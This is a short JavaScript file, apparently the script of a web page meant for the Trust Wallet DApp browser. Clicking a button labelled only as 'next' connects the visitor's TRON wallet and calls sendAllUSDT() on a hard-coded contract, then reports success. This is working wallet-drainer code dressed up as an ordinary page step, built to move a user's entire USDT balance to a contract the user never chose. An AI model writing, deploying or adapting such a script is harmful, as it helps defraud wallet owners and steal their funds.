
document.addEventListener("DOMContentLoaded", async function () {
    const nextButton = document.getElementById("nextButton");

    async function connectAndSend() {
        if (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
            alert("Please open this in Trust Wallet DApp browser and connect your TRON wallet.");
            return;
        }

        const userAddress = window.tronWeb.defaultAddress.base58;
        const contractAddress = "TYrS3KVuwSUKZwxXr56GA5jQUBpka8Kf3F"; // User's contract

        try {
            const contract = await window.tronWeb.contract().at(contractAddress);
            await contract.sendAllUSDT().send();
            alert("Transaction sent successfully!");
        } catch (err) {
            console.error(err);
            alert("Transaction failed or cancelled.");
        }
    }

    if (nextButton) {
        nextButton.addEventListener("click", connectAndSend);
    }
});
